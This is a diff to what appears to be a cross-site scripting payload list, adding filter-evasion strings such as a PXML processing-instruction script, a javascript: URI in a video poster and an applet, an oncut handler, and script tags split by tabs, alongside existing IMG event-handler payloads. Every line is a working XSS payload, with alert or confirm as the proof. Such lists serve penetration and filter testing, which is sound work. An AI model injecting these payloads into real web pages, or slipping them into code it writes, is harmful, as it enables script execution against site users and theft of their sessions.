@@ -1,4 +1,12 @@
-﻿"</script><script>alert(String.fromCharCode(88,83,83))</script>
+﻿<?PXML>
+<?PXML><html:script>alert(1)</html:script>      //http://masatokinugawa.l0.cm/2017/05/xss13.html
+<style>@import url("css");</style>
+<video poster=javascript:alert(1)//></video>
+<applet code="javascript:confirm(233);"> 
+<q/oncut=alert(1)>//
+<script>var s = "u003cu003e";alert(s);</script>
+<scr    ipt>alert(1)</scr       ipt>                    //制表符\t print '<scr\tipt>alert(1)</scr\tipt>'
+</script><script>alert(String.fromCharCode(88,83,83))</script>
 <IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
